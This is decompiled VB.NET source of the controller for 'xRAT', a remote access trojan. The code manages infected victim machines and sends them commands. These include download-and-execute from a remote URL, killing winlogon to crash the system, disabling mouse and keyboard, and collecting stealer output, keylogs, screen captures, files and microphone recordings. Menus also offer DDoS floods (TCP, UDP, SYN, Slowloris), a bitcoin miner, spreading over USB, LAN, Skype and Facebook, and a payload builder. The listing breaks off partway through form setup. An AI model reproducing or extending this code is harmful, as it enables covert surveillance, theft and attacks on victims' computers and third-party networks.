Imports iniSettings
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Management
Imports System.Net
Imports System.Net.NetworkInformation
Imports System.Net.Sockets
Imports System.Runtime.CompilerServices
Imports System.Runtime.InteropServices
Imports System.Text
Imports System.Threading
Imports System.Windows.Forms

Namespace xRAT
    <DesignerGenerated> _
    Public Class Form1
        Inherits Form
        ' Methods
        Public Sub New()
            Class1.QaIGh5M7cuigS
            AddHandler MyBase.Load, New EventHandler(AddressOf Me.Form1_Load)
            AddHandler MyBase.FormClosing, New FormClosingEventHandler(AddressOf Me.Form1_FormClosing)
            AddHandler MyBase.SizeChanged, New EventHandler(AddressOf Me.Form1_SizeChanged)
            Me.enable = True
            Me.int_0 = 0
            Me.listening = False
            Me.inisettings = New iniSettings((Application.StartupPath & "\settings.ini"))
            Me.int_1 = 0
            Me.InitializeComponent
        End Sub

        Public Sub AddClient(ByVal client As Connection, ByVal strings As String())
            Dim item As New ListViewItem(strings)
            Dim num As Integer = (Me.ImageList1.Images.Count - 1)
            Dim i As Integer = 0
            Do While (i <= num)
                If Me.ImageList1.Images.Keys.Item(i).ToLower.Contains(strings(9).ToLower) Then
                    item.ImageIndex = i
                    Exit Do
                End If
                i += 1
            Loop
            item.Tag = client
            Me.int_0 += 1
            Me.txtOnline.Text = ("Users Online: " & Conversions.ToString(Me.int_0))
            Me.lstClients.Items.Add(item)
            If ((Me.popupnotify = 1) AndAlso File.Exists("data\audio.wav")) Then
                Class2.Class10_0.Audio.Play("data\audio.wav")
            End If
            Dim items As String() = New String(3  - 1) {}
            items(0) = Conversions.ToString(DateTime.Now)
            items(1) = (strings(0) & " connected.")
            Dim item2 As New ListViewItem(items)
            Me.ListView1.Items.Add(item2)
            If (Me.autosize = 1) Then
                Me.AppNewAutosizeColumns(Me.lstClients)
            End If
        End Sub

        Private Sub AntiAvastSandBoxToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Class2.Class4_0.method_0.Show
        End Sub

        Public Sub AppNewAutosizeColumns(ByVal TargetListView As ListView)
            Dim num As Long = (TargetListView.Columns.Count - 1)
            Dim i As Long = 0
            Do While (i <= num)
                Form1.SendMessageA(TargetListView.Handle, &H101E, CInt(i), -2)
                i = (i + 1)
            Loop
        End Sub

        Private Sub AttackToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Me.SendToSelected(String.Concat(New String() { "STCP|", Me.ToolStripTextBox9.Text, "|", Me.ToolStripTextBox10.Text, "|", Me.ToolStripTextBox11.Text }))
            End If
        End Sub

        Private Sub BinderToolStripMenuItem1_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Interaction.Shell("data\IExpress.exe", AppWinStyle.MinimizedFocus, False, -1)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub BipSoundToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Me.SendToSelected("DL|http://mes-images.voila.net/Bip.exe")
            End If
        End Sub

        Private Sub BitCoinMinerToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Class2.Class4_0.method_1.Show
            End If
        End Sub

        Private Sub BSODToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Me.SendToSelected("PRCKILL|winlogon")
            End If
        End Sub

        Private Sub Button1_Click(ByVal sender As Object, ByVal e As EventArgs)
            Dim str2 As String
            Me.TextBox1.Text = Convert.ToBase64String(New ASCIIEncoding().GetBytes(Me.TextBox1.Text))
            Dim path As String = (FileSystem.CurDir & "\data\databotphp.exe")
            If Me.CheckBox1.Checked Then
                str2 = "okadd"
            Else
                str2 = "noadd"
            End If
            If Not File.Exists(path) Then
                Application.Exit
            Else
                If File.Exists("botphp.exe") Then
                    File.Delete("botphp.exe")
                End If
                File.Copy(path, (FileSystem.CurDir & "\botphp.exe"))
                File.AppendAllText((FileSystem.CurDir & "\botphp.exe"), ("Dico" & Me.TextBox1.Text & "Dico" & str2))
                Me.Win8Progressbar1.Value = Conversions.ToInteger("100")
                MessageBox.Show("botphp.exe is build.", "", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
            End If
        End Sub

        Private Sub Button2_Click(ByVal sender As Object, ByVal e As EventArgs)
        End Sub

        Public Function ByteArray2Image(ByVal ByAr As Byte()) As Image
            Dim image2 As Image
            Dim stream As New MemoryStream(ByAr)
            Try 
                Return Image.FromStream(stream)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                image2 = Nothing
                ProjectData.ClearProjectError
            End Try
            Return image2
        End Function

        Private Sub ClearTraceHistoryToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            MessageBox.Show("Clear Trace !", "", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
        End Sub

        Private Sub CloseCDToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Me.SendToSelected("CLOSEDVD")
            End If
        End Sub

        Private Sub CloseToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Me.SendToSelected("SCLOSE")
            End If
        End Sub

        Private Sub ComboBox1_SelectedIndexChanged(ByVal sender As Object, ByVal e As EventArgs)
        End Sub

        Private Sub ComputerNameToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstcpname.Width = Conversions.ToDouble("0")) Then
                Me.lstcpname.Width = Conversions.ToInteger("140")
            Else
                Me.lstcpname.Width = Conversions.ToInteger("0")
            End If
        End Sub

        Private Sub CountryToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstcountry.Width = Conversions.ToDouble("0")) Then
                Me.lstcountry.Width = Conversions.ToInteger("140")
            Else
                Me.lstcountry.Width = Conversions.ToInteger("0")
            End If
        End Sub

        Public Function Decrypt(ByVal CodeKey As String, ByVal DataIn As String) As String
            Dim str As String = Nothing
            Dim num As Long = CLng(Math.Round(CDbl((CDbl(Strings.Len(DataIn)) / 2))))
            Dim i As Long = 1
            Do While (i <= num)
                Dim num3 As Integer = CInt(Math.Round(Conversion.Val(("&H" & Strings.Mid(DataIn, CInt(((2 * i) - 1)), 2)))))
                Dim num4 As Integer = Strings.Asc(Strings.Mid(CodeKey, CInt(((i Mod CLng(Strings.Len(CodeKey))) + 1)), 1))
                str = (str & Conversions.ToString(Strings.Chr((num3 Xor num4))))
                i = (i + 1)
            Loop
            Return str
        End Function

        Public Sub Dirfile(ByVal dirs As String, ByVal files As String, ByVal path As String)
            Dim strArray As String() = dirs.Split(New Char() { "<"c })
            Class2.Class4_0.method_5.ListView1.Items.Clear
            Class2.Class4_0.method_5.TextBox1.Text = path
            Class2.Class4_0.method_5.ListView1.Items.Add("\", 0)
            Class2.Class4_0.method_5.ListView1.Items.Add("..", 0)
            Dim str2 As String
            For Each str2 In strArray
                If (str2 <> Nothing) Then
                    Dim strArray8 As String() = str2.Split(New Char() { "\"c })
                    Class2.Class4_0.method_5.ListView1.Items.Add(strArray8((strArray8.Length - 1)), 0)
                End If
            Next
            Dim str3 As String
            For Each str3 In files.Split(New Char() { "<"c })
                If (str3 <> Nothing) Then
                    Dim strArray3 As String() = str3.Split(New Char() { ":"c })
                    Dim num2 As Double = (Conversions.ToDouble(strArray3(1)) / 1000000)
                    Dim str As String = ""
                    If (Math.Round(num2, 0) = 0) Then
                        num2 = (Conversions.ToDouble(strArray3(1)) / 1000)
                        str = (Conversions.ToString(Math.Round(num2, 2)) & " KB")
                    ElseIf (Math.Round(num2, 0) > 1000) Then
                        num2 = (Conversions.ToDouble(strArray3(1)) / 1000000000)
                        str = (Conversions.ToString(Math.Round(num2, 2)) & " GB")
                    Else
                        str = (Conversions.ToString(Math.Round(num2, 2)) & " MB")
                    End If
                    Dim items As String() = New String() { strArray3(0), str }
                    Dim item As New ListViewItem(items)
                    If strArray3(0).EndsWith(".txt".ToLower) Then
                        item.ImageIndex = 2
                    Else
                        item.ImageIndex = 1
                    End If
                    Class2.Class4_0.method_5.ListView1.Items.Add(item)
                End If
            Next
        End Sub

        Private Sub DisableMouseAndKeyboardToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Me.SendToSelected("APIDISABLE")
            End If
        End Sub

        Public Sub Disconnected(ByVal client As Connection)
            Me.Invoke(New DisconnectedDelegate(AddressOf Me.Remove), New Object() { client })
        End Sub

        Public Sub DisplayMessage(ByVal msg As String)
            Dim box As TextBox = Class2.Class4_0.method_3.TextBox2
            box.Text = (box.Text & ChrW(13) & ChrW(10) & "Slave: " & msg)
            Class2.Class4_0.method_3.TextBox2.SelectionStart = Class2.Class4_0.method_3.TextBox2.Text.Length
            Class2.Class4_0.method_3.TextBox2.ScrollToCaret
        End Sub

        <DebuggerNonUserCode> _
        Protected Overrides Sub Dispose(ByVal disposing As Boolean)
            Try 
                If (disposing AndAlso (Not Me.icontainer_0 Is Nothing)) Then
                    Me.icontainer_0.Dispose
                End If
            Finally
                MyBase.Dispose(disposing)
            End Try
        End Sub

        Public Sub Drives(ByVal drives As String)
            Dim strArray As String() = drives.Split(New Char() { ">"c })
            Class2.Class4_0.method_5.ComboBox1.Items.Clear
            Class2.Class4_0.method_5.ComboBox1.Text = strArray(0)
            Dim str As String
            For Each str In strArray
                If (str <> Nothing) Then
                    Class2.Class4_0.method_5.ComboBox1.Items.Add(str)
                End If
            Next
        End Sub

        Private Sub EnableMouseAndKeyboardToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Me.SendToSelected("APIENABLE")
            End If
        End Sub

        Public Function Encrypt(ByVal CodeKey As String, ByVal DataIn As String) As String
            Dim str As String = Nothing
            Dim num As Long = Strings.Len(DataIn)
            Dim i As Long = 1
            Do While (i <= num)
                Dim num3 As Integer = Strings.Asc(Strings.Mid(DataIn, CInt(i), 1))
                Dim num4 As Integer = Strings.Asc(Strings.Mid(CodeKey, CInt(((i Mod CLng(Strings.Len(CodeKey))) + 1)), 1))
                Dim number As Integer = (num3 Xor num4)
                Dim expression As String = Conversion.Hex(number)
                If (Strings.Len(expression) = 1) Then
                    expression = ("0" & expression)
                End If
                str = (str & expression)
                i = (i + 1)
            Loop
            Return str
        End Function

        Private Sub ExitToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Application.Exit
        End Sub

        Private Sub ExitToolStripMenuItem1_Click(ByVal sender As Object, ByVal e As EventArgs)
            Application.Exit
        End Sub

        Private Sub ExtensionChangerToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Interaction.Shell("data\Spoofer.exe", AppWinStyle.MinimizedFocus, False, -1)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub FileManagerToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Class2.Class4_0.method_3.ShowDialog
            End If
        End Sub

        Private Sub FixMouseButtonToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Me.SendToSelected("DSWAPMOUSEBUTTON")
            End If
        End Sub

        Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As FormClosingEventArgs)
            Try 
                Me.inisettings.UpdateSingleSetting("PORT", Conversions.ToString(Me.port), True)
                Me.inisettings.UpdateSingleSetting("PASSWORD", Me.password, True)
                Me.inisettings.UpdateSingleSetting("POPUPNOTIFY", Conversions.ToString(Me.popupnotify), True)
                Me.inisettings.UpdateSingleSetting("AUTOREFRESHINT", Conversions.ToString(Me.autorefreshInt), True)
                Me.inisettings.UpdateSingleSetting("AUTOREFRESHENABLED", Conversions.ToString(Me.autorefreshact), True)
                Me.inisettings.UpdateSingleSetting("AUTOSIZECOL", Conversions.ToString(Me.autosize), True)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Interaction.MsgBox(("Access denied for path:" & ChrW(13) & ChrW(10) & Application.StartupPath), MsgBoxStyle.Exclamation, Nothing)
                ProjectData.ClearProjectError
            End Try
            If (e.CloseReason <> CloseReason.ApplicationExitCall) Then
                Me.Hide
                Me.NotifyIcon1.ShowBalloonTip(15, "Running in background", "xRAT is now running in background.", ToolTipIcon.Info)
                e.Cancel = True
            End If
        End Sub

        Private Sub Form1_Load(ByVal sender As Object, ByVal e As EventArgs)
            Dim flag As Boolean
            Try 
                Dim client As WebClient
                Dim str As String = String.Empty
                Dim instances As ManagementObjectCollection = New ManagementClass("win32_processor").GetInstances
                Using enumerator As ManagementObjectEnumerator = instances.GetEnumerator
                    Dim current As ManagementObject
                    Do While enumerator.MoveNext
                        current = DirectCast(enumerator.Current, ManagementObject)
                        If (str = "") Then
                            goto Label_004A
                        End If
                    Loop
                    goto Label_0072
                Label_004A:
                    str = current.Properties.Item("processorID").Value.ToString
                End Using
            Label_0072:
                client = New WebClient
                Dim str2 As String = client.DownloadString(Me.Decrypt("hwodpkiow41qd", "1F1B1000514640075C4113064601000D1C0A470112401E1B0D03591B1C04"))
                client.Dispose
                If Not str2.Contains(str) Then
                    Application.Exit
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError
            End Try
            Dim point As New Point(&H3BA, 350)
            Me.MinimumSize = DirectCast(point, Size)
            Me.mutex_0 = New Mutex(False, "xRAT-2186192612", flag)
            If Not flag Then
                MessageBox.Show("Application is already running.", Me.Text, MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
                Application.Exit
            End If
            If Not File.Exists((Application.StartupPath & "\data\GeoIP.dat")) Then
                Interaction.MsgBox(("Can't find """ & Application.StartupPath & "\data\GeoIP.dat"""), MsgBoxStyle.Exclamation, Nothing)
                Application.Exit
            End If
            If File.Exists((Application.StartupPath & "\settings.ini")) Then
                Me.port = Conversions.ToInteger(Me.inisettings.LoadSetting("PORT", False))
                Me.password = Me.inisettings.LoadSetting("PASSWORD", False)
                Me.popupnotify = Conversions.ToInteger(Me.inisettings.LoadSetting("POPUPNOTIFY", False))
                Me.autorefreshInt = Conversions.ToInteger(Me.inisettings.LoadSetting("AUTOREFRESHINT", False))
                Me.autorefreshact = Conversions.ToInteger(Me.inisettings.LoadSetting("AUTOREFRESHENABLED", False))
                Me.autosize = Conversions.ToInteger(Me.inisettings.LoadSetting("AUTOSIZECOL", False))
            Else
                Try 
                    Me.inisettings.AddSetting("PORT", Conversions.ToString(&H1B60))
                    Me.inisettings.AddSetting("PASSWORD", "passwd")
                    Me.inisettings.AddSetting("POPUPNOTIFY", Conversions.ToString(1))
                    Me.inisettings.AddSetting("AUTOREFRESHINT", Conversions.ToString(60))
                    Me.inisettings.AddSetting("AUTOREFRESHENABLED", Conversions.ToString(1))
                    Me.inisettings.AddSetting("AUTOSIZECOL", Conversions.ToString(1))
                    Me.inisettings.SaveAllSettings(False)
                    Me.port = &H1B60
                    Me.password = "passwd"
                    Me.popupnotify = 1
                    Me.autorefreshInt = 60
                    Me.autorefreshact = 1
                    Me.autosize = 1
                Catch exception2 As Exception
                    ProjectData.SetProjectError(exception2)
                    Interaction.MsgBox(("Access denied for path:" & ChrW(13) & ChrW(10) & Application.StartupPath), MsgBoxStyle.Exclamation, Nothing)
                    ProjectData.ClearProjectError
                End Try
            End If
            If (Me.autorefreshact = 1) Then
                Me.Timer1.Interval = (Me.autorefreshInt * &H3E8)
                Me.Timer1.Enabled = True
            End If
        End Sub

        Private Sub Form1_SizeChanged(ByVal sender As Object, ByVal e As EventArgs)
            Me.Refresh
        End Sub

        Private Sub FormGrabberToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Class2.Class4_0.method_9.Show
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub GetIPToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Class2.Class4_0.method_11.Show
        End Sub

        Public Function GetPingMs(ByRef hostNameOrAddress As String) As Object
            Dim obj2 As Object
            Dim ping As New Ping
            Try 
                Dim reply As PingReply = ping.Send(hostNameOrAddress)
                Dim roundtripTime As Long = reply.RoundtripTime
                If (reply.Status = IPStatus.Success) Then
                    If (Conversions.ToDouble(roundtripTime.ToString) = 0) Then
                        Return (Conversions.ToString(1) & " ms")
                    End If
                    Return (roundtripTime.ToString & " ms")
                End If
                obj2 = "> 200 ms"
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                obj2 = "Dead"
                ProjectData.ClearProjectError
            End Try
            Return obj2
        End Function

        Private Sub GetRecordToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Me.SendToSelected("MICRODOWN")
            End If
        End Sub

        Public Sub GetSysInfo(ByVal os As String, ByVal cpu As String, ByVal cores As String, ByVal videocard As String, ByVal windir As String, ByVal ram As String, ByVal isAdmin As String)
            Class2.Class4_0.method_24.TextBox1.Text = os
            Class2.Class4_0.method_24.TextBox2.Text = cpu
            Class2.Class4_0.method_24.TextBox3.Text = cores
            Class2.Class4_0.method_24.TextBox4.Text = videocard
            Class2.Class4_0.method_24.TextBox5.Text = windir
            Class2.Class4_0.method_24.TextBox6.Text = ram
            Class2.Class4_0.method_24.TextBox7.Text = isAdmin
            Class2.Class4_0.method_24.Label7.Visible = False
            Class2.Class4_0.method_24.PictureBox1.Visible = False
        End Sub

        Public Sub GotInfo(ByVal client As Connection, ByVal Msg As String)
            Try 
                Dim strArray As String() = Msg.Split(New Char() { "|"c })
                Select Case strArray(0)
                    Case "CONNECTED"
                        If (Conversions.ToDouble(Me.ToolStripTextBox14.Text) <> Me.int_0) Then
                            If (Me.Decrypt("Secr2t-pizza-homerPWD24", strArray(7)) = Me.password) Then
                                Dim str3 As String = Conversions.ToString(Me.GetPingMs(Conversions.ToString(client.Object_0)))
                                Dim strArray2 As String() = strArray(3).Split(New Char() { "\"c })
                                Me.Invoke(New AddDelegate(AddressOf Me.AddClient), New Object() { client, New String() { Conversions.ToString(client.Object_0), strArray(1), strArray(2), strArray2(0), strArray2(1), strArray(4), strArray(5), Conversions.ToString(Me.LookUpDetails(Conversions.ToString(client.Object_0))), str3, strArray(6) } })
                            End If
                            Dim flag1 As Boolean = Class2.Class4_0.method_21.CheckBox4.Checked
                            If (Me.ComboBox1.Text = "Download & Execute") Then
                                Try 
                                    Me.SendToAll(("DL|" & Me.TextBox2.Text))
                                Catch exception1 As Exception
                                    ProjectData.SetProjectError(exception1)
                                    ProjectData.ClearProjectError
                                End Try
                            End If
                        End If
                        Return
                    Case "STATUS"
                        Me.Invoke(New UpdateStatusDelegate(AddressOf Me.UpdateStatus), New Object() { client, strArray(1) })
                        Return
                    Case "STATUSFM"
                        Me.Invoke(New UpdateStatusFilemanagerDelegate(AddressOf Me.UpdateStatusFilemanager), New Object() { strArray(1) })
                        Return
                    Case "SYSINFO"
                        Me.Invoke(New DelegateGetSysInfo(AddressOf Me.GetSysInfo), New Object() { strArray(1), strArray(2), strArray(3), strArray(4), strArray(5), strArray(6), strArray(7) })
                        Return
                    Case "REMOTEDESK"
                        Dim s As String = strArray(1)
                        Dim byAr As Byte() = Convert.FromBase64String(s)
                        Dim num As Integer = CInt(Math.Round(CDbl((CDbl(byAr.Length) / 1024))))
                        Dim image As Image = Me.ByteArray2Image(byAr)
                        Me.Invoke(New DelegateRemoteDesk(AddressOf Me.RemoteDesk), New Object() { image, num })
                        Return
                    Case "CHAT"
                        Me.Invoke(New DelDisplayMessage(AddressOf Me.DisplayMessage), New Object() { strArray(1) })
                        Return
                    Case "STealerRecu"
                        Me.RichTextBox2.Text = ""
                        Me.RichTextBox2.AppendText(strArray(1))
                        Return
                    Case "SENDLOG"
                        Me.RichTextBox3.Text = ""
                        Me.RichTextBox3.AppendText(strArray(1))
                        Return
                    Case "PRCLIST"
                        Dim str5 As String = Nothing
                        Dim str6 As String
                        For Each str6 In strArray
                            If ((str6 <> "PRCLIST") AndAlso (str6 <> Nothing)) Then
                                str5 = (str5 & str6 & "|")
                            End If
                        Next
                        str5 = str5.Remove((str5.Length - 1))
                        Me.Invoke(New PrcListDelegate(AddressOf Me.PrcList), New Object() { str5 })
                        Return
                    Case "DIR"
                        Me.Invoke(New DirDelegate(AddressOf Me.Dirfile), New Object() { strArray(1), strArray(2), strArray(3) })
                        Return
                    Case "DRIVES"
                        Me.Invoke(New DelDrives(AddressOf Me.Drives), New Object() { strArray(1) })
                        Exit Select
                    Case "SENDFILE"
                        Me.Invoke(New DelSaveDownloadedFile(AddressOf Me.SaveDownloadedFile), New Object() { client, Convert.FromBase64String(strArray(1)), strArray(2) })
                        Me.Invoke(New UpdateStatusFilemanagerDelegate(AddressOf Me.UpdateStatusFilemanager), New Object() { Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("File downloaded and saved to ""Users\", client.Object_0), "\"), strArray(2)), """") })
                        Exit Select
                End Select
            Catch exception2 As Exception
                ProjectData.SetProjectError(exception2)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub HideTaskbarToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Me.SendToSelected("Cachelabarre")
            End If
        End Sub

        <DebuggerStepThrough> _
        Private Sub InitializeComponent()
            Me.icontainer_0 = New Container
            Dim manager As New ComponentResourceManager(GetType(Form1))
            Me.ContextMenuStrip1 = New ContextMenuStrip(Me.icontainer_0)
            Me.ListenToolStripMenuItem = New ToolStripMenuItem
            Me.StopToolStripMenuItem = New ToolStripMenuItem
            Me.RefreshToolStripMenuItem = New ToolStripMenuItem
            Me.ToolStripMenuItem1 = New ToolStripSeparator
            Me.ShowSystemInformationToolStripMenuItem = New ToolStripMenuItem
            Me.ViewRemoteDesktopToolStripMenuItem = New ToolStripMenuItem
            Me.WebcamToolStripMenuItem = New ToolStripMenuItem
            Me.FunStuffToolStripMenuItem = New ToolStripMenuItem
            Me.OpenCDToolStripMenuItem = New ToolStripMenuItem
            Me.CloseCDToolStripMenuItem = New ToolStripMenuItem
            Me.ToolStripSeparator1 = New ToolStripSeparator
            Me.SpeakComputerToolStripMenuItem = New ToolStripMenuItem
            Me.ToolStripTextBox1 = New ToolStripTextBox
            Me.OkToolStripMenuItem = New ToolStripMenuItem
            Me.ToolStripSeparator2 = New ToolStripSeparator
            Me.PlayMusicToolStripMenuItem = New ToolStripMenuItem
            Me.ToolStripTextBox6 = New ToolStripTextBox
            Me.OkToolStripMenuItem5 = New ToolStripMenuItem
            Me.ToolStripSeparator4 = New ToolStripSeparator
            Me.MessageBoxToolStripMenuItem1 = New ToolStripMenuItem
            Me.ToolStripSeparator13 = New ToolStripSeparator
            Me.HideTaskbarToolStripMenuItem = New ToolStripMenuItem
            Me.ShowTaskbarToolStripMenuItem = New ToolStripMenuItem
            Me.ToolStripSeparator3 = New ToolStripSeparator
            Me.MsnControlToolStripMenuItem = New ToolStripMenuItem
            Me.FreezeToolStripMenuItem = New ToolStripMenuItem
            Me.ToolStripTextBox3 = New ToolStripTextBox
            Me.OkToolStripMenuItem2 = New ToolStripMenuItem
            Me.UnfreezeToolStripMenuItem = New ToolStripMenuItem
            Me.ToolStripTextBox4 = New ToolStripTextBox
            Me.OkToolStripMenuItem3 = New ToolStripMenuItem
            Me.ToolStripSeparator6 = New ToolStripSeparator
            Me.BipSoundToolStripMenuItem = New ToolStripMenuItem
            Me.ToolStripSeparator8 = New ToolStripSeparator
            Me.RandomIconDesktopToolStripMenuItem = New ToolStripMenuItem
            Me.ToolStripSeparator10 = New ToolStripSeparator
            Me.RandomCursorToolStripMenuItem = New ToolStripMenuItem
            Me.ToolStripSeparator11 = New ToolStripSeparator
            Me.BSODToolStripMenuItem = New ToolStripMenuItem
            Me.ToolStripSeparator9 = New ToolStripSeparator
            Me.SwapMouseButtonToolStripMenuItem = New ToolStripMenuItem
            Me.FixMouseButtonToolStripMenuItem = New ToolStripMenuItem
            Me.ToolStripSeparator12 = New ToolStripSeparator
            Me.MatrixScreenToolStripMenuItem = New ToolStripMenuItem
            Me.ProcessesToolStripMenuItem = New ToolStripMenuItem
            Me.ListToolStripMenuItem = New ToolStripMenuItem
            Me.StartToolStripMenuItem3 = New ToolStripMenuItem
            Me.KillToolStripMenuItem = New ToolStripMenuItem
            Me.RecordAudioToolStripMenuItem = New ToolStripMenuItem
            Me.RecordToolStripMenuItem = New ToolStripMenuItem
            Me.StopRecordToolStripMenuItem = New ToolStripMenuItem
            Me.ToolStripSeparator5 = New ToolStripSeparator
            Me.GetRecordToolStripMenuItem = New ToolStripMenuItem
            Me.ComputerToolStripMenuItem = New ToolStripMenuItem
            Me.RestartToolStripMenuItem = New ToolStripMenuItem
            Me.ShutdownToolStripMenuItem = New ToolStripMenuItem
            Me.EnableMouseAndKeyboardToolStripMenuItem = New ToolStripMenuItem
            Me.DisableMouseAndKeyboardToolStripMenuItem = New ToolStripMenuItem
            Me.ClearTraceHistoryToolStripMenuItem = New ToolStripMenuItem
            Me.StealerToolStripMenuItem = New ToolStripMenuItem
            Me.RemoteFileManagerToolStripMenuItem = New ToolStripMenuItem
            Me.KeyloggzeToolStripMenuItem = New ToolStripMenuItem
            Me.OpenWebsiteToolStripMenuItem = New ToolStripMenuItem
            Me.VisitWebsiteToolStripMenuItem = New ToolStripMenuItem
            Me.RemoteDownloadExecuteToolStripMenuItem = New ToolStripMenuItem
            Me.FileManagerToolStripMenuItem = New ToolStripMenuItem
            Me.SpreadToolStripMenuItem = New ToolStripMenuItem
            Me.SkypeToolStripMenuItem = New ToolStripMenuItem
            Me.ToolStripTextBox2 = New ToolStripTextBox
            Me.OkToolStripMenuItem1 = New ToolStripMenuItem
            Me.FacebookToolStripMenuItem = New ToolStripMenuItem
            Me.ToolStripTextBox13 = New ToolStripTextBox
            Me.OkToolStripMenuItem7 = New ToolStripMenuItem
            Me.UsbToolStripMenuItem = New ToolStripMenuItem
            Me.LanToolStripMenuItem = New ToolStripMenuItem
            Me.HideShowColumsToolStripMenuItem = New ToolStripMenuItem
            Me.IPAdressToolStripMenuItem = New ToolStripMenuItem
            Me.VersionToolStripMenuItem = New ToolStripMenuItem
            Me.StatusToolStripMenuItem = New ToolStripMenuItem
            Me.ComputerNameToolStripMenuItem = New ToolStripMenuItem
            Me.UsernameToolStripMenuItem = New ToolStripMenuItem
            Me.WindowsKeyToolStripMenuItem = New ToolStripMenuItem
            Me.OSToolStripMenuItem = New ToolStripMenuItem
            Me.CountryToolStripMenuItem = New ToolStripMenuItem
            Me.PingToolStripMenuItem = New ToolStripMenuItem
            Me.Sock5ToolStripMenuItem = New ToolStripMenuItem
            Me.ToolStripTextBox7 = New ToolStripTextBox
            Me.OkToolStripMenuItem6 = New ToolStripMenuItem
            Me.TracerouteIPToolStripMenuItem = New ToolStripMenuItem
            Me.BotkillToolStripMenuItem = New ToolStripMenuItem
            Me.StartToolStripMenuItem2 = New ToolStripMenuItem
            Me.StopToolStripMenuItem2 = New ToolStripMenuItem
            Me.BitCoinMinerToolStripMenuItem = New ToolStripMenuItem
            Me.DDOSToolStripMenuItem = New ToolStripMenuItem
            Me.TCPToolStripMenuItem = New ToolStripMenuItem
            Me.StartToolStripMenuItem1 = New ToolStripMenuItem
            Me.ToolStripTextBox9 = New ToolStripTextBox
            Me.ToolStripTextBox10 = New ToolStripTextBox
            Me.ToolStripTextBox11 = New ToolStripTextBox
            Me.AttackToolStripMenuItem = New ToolStripMenuItem
            Me.StopToolStripMenuItem1 = New ToolStripMenuItem
            Me.UDPToolStripMenuItem = New ToolStripMenuItem
            Me.StartToolStripMenuItem5 = New ToolStripMenuItem
            Me.StopToolStripMenuItem6 = New ToolStripMenuItem
            Me.SUDPToolStripMenuItem = New ToolStripMenuItem
            Me.ToolStripTextBox5 = New ToolStripTextBox
            Me.ToolStripTextBox12 = New ToolStripTextBox
            Me.OkToolStripMenuItem4 = New ToolStripMenuItem
            Me.SSYNToolStripMenuItem = New ToolStripMenuItem
            Me.StartToolStripMenuItem6 = New ToolStripMenuItem
            Me.StopToolStripMenuItem5 = New ToolStripMenuItem
            Me.SlowlorisToolStripMenuItem = New ToolStripMenuItem
            Me.StartToolStripMenuItem4 = New ToolStripMenuItem
            Me.StopToolStripMenuItem4 = New ToolStripMenuItem
            Me.EToolStripMenuItem = New ToolStripMenuItem
            Me.ToolStripTextBox8 = New ToolStripTextBox
            Me.StartToolStripMenuItem = New ToolStripMenuItem
            Me.GetIPToolStripMenuItem = New ToolStripMenuItem
            Me.ServerToolStripMenuItem = New ToolStripMenuItem
            Me.RestartToolStripMenuItem1 = New ToolStripMenuItem
            Me.CloseToolStripMenuItem = New ToolStripMenuItem
            Me.ImageList1 = New ImageList(Me.icontainer_0)
            Me.MenuStrip1 = New MenuStrip
            Me.ToolStripMenuItem2 = New ToolStripMenuItem
            Me.FileToolStripMenuItem = New ToolStripMenuItem
            Me.SettingsToolStripMenuItem = New ToolStripMenuItem
            Me.NoipUpdateToolStripMenuItem = New ToolStripMenuItem
            Me.ExitToolStripMenuItem = New ToolStripMenuItem
